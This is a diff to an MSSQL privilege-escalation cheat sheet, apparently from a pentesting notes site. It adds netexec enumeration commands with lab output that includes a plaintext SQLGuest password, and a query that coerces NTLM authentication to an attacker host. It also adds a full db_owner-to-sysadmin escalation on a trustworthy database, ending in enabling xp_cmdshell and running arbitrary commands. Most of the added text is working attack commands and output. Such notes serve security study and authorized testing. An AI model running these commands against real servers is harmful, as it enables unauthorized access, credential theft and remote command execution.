@@ -1,6 +1,5 @@
 ---
 title: "MSSQL Privilege Escalation"
-date: 2025-7-17
 tags: ["Hash Cracking", "Privilege Escalation", "Ntlm", "MSSQL", "Database", "Windows", "RCE", "Enum", "Domain Users", "SID", "NTLM Relay"]
 ---
 
@@ -10,9 +9,22 @@ tags: ["Hash Cracking", "Privilege Escalation", "Ntlm", "MSSQL", "Database", "Wi
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. List Users that Can be Impersonated
+#### 1. Check Privesc Path
 
 ```console
+# Local auth
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M mssql_priv
+```
+
+```console
+# Domain
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M mssql_priv
+```
+
+#### 2. List Users that Can be Impersonated
+
+```console
+# Local auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_impersonate
 ```
 
@@ -23,9 +35,15 @@ MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4Fywl
 ENUM_IMP... 10.129.254.242  1433   DC               [-] No users with impersonation rights found.
 ```
 
-#### 2. Enumerate Active MSSQL Logins
+```console
+# Domain
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M enum_impersonate
+```
+
+#### 3. Enumerate Active MSSQL Logins
 
 ```console
+# Local auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_logins
 ```
 
@@ -38,9 +56,15 @@ ENUM_LOGINS 10.129.254.242  1433   DC               [*]   - sa
 ENUM_LOGINS 10.129.254.242  1433   DC               [*]   - SQLGuest
 ```
 
-#### 3. Enumerate Linked MSSQL Servers
+```console
+# Domain
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M enum_logins
+```
+
+#### 4. Enumerate Linked MSSQL Servers
 
 ```console
+# Local auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_links
 ```
 
@@ -50,6 +74,11 @@ MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Buil
 MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
 ENUM_LINKS  10.129.254.242  1433   DC               [+] Linked servers found:
 ENUM_LINKS  10.129.254.242  1433   DC               [*]   - WIN-Q13O908QBPG\SQLEXPRESS
+```
+
+```console
+# Domain
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M enum_links
 ```
 
 {{< /tabcontent >}}
@@ -359,6 +388,11 @@ use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing';
 load_file('\\<LOCAL_IP>\any\thing');
 ```
 
+```console
+# Method 3
+SELECT * FROM sys.dm_os_file_exists('\\<LOCAL_IP>\any\thing')
+```
+
 {{< /tabcontent >}}
 
 ---
@@ -531,7 +565,82 @@ execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass <CM
 
 ---
 
-### Abuse #5: Run External Script
+### Abuse #5: Exploit DB Owner
+
+#### 1. Check Trustworthy Databases
+
+```console
+SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;
+```
+
+```console {class="sample-code"}
+name                                                                                                                             is_trustworthy_on
+------------
+master     0
+tempdb     0
+model      0
+msdb       1
+```
+
+#### 2. Check DB Owner
+
+```console
+# Select target db
+USE <TARGET_DB>;
+```
+
+```console
+# With target db in use
+SELECT rp.name as database_role, mp.name as database_user from sys.database_role_members drm join sys.database_principals rp on (drm.role_principal_id = rp.principal_id) join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
+```
+
+```console {class="sample-code"}
+SQLAgentUserRole            SQLAgentReaderRole                                                                                                              
+SQLAgentReaderRole          SQLAgentOperatorRole                                                                                                            
+SQLAgentUserRole            dc_operator                                                                                                                     
+db_ssisltduser              dc_operator                                                                                                                     
+db_ssisoperator             dc_operator                                                                                                                     
+dc_operator                 dc_admin                                                                                                                        
+db_ssisltduser              dc_proxy                                                                                                                        
+db_ssisoperator             dc_proxy                                                                                                                        
+SQLAgentUserRole            MS_DataCollectorInternalUser                                                                                                    
+db_ssisoperator             MS_DataCollectorInternalUser                                                                                                    
+dc_admin                    MS_DataCollectorInternalUser                                                                                                    
+SQLAgentOperatorRole        PolicyAdministratorRole                                                                                                         
+ServerGroupReaderRole       ServerGroupAdministratorRole                                                                                                    
+PolicyAdministratorRole     ##MS_PolicyEventProcessingLogin##                                                                                               
+PolicyAdministratorRole     ##MS_PolicyTsqlExecutionLogin##                                                                                                 
+UtilityIMRReader            UtilityIMRWriter                                                                                                                
+db_owner                    EXAMPLE\svc_sql                                                                                                             
+
+(18 rows affected)
+```
+
+#### 3. Exploit DB Owner
+
+```console
+CREATE OR ALTER PROCEDURE dbo.test WITH EXECUTE AS owner AS ALTER SERVER ROLE sysadmin ADD MEMBER [<DB_OWNER>];
+```
+
+```console
+EXEC dbo.test;
+```
+
+```console
+EXEC sp_configure 'show advanced options', 1; Reconfigure;
+```
+
+```console
+EXEC sp_configure 'xp_cmdshell', 1; Reconfigure;
+```
+
+```console
+EXEC xp_cmdshell '<CMD>'
+```
+
+---
+
+### Abuse #6: Run External Script
 
 #### 1. Run External Script (Python)
 
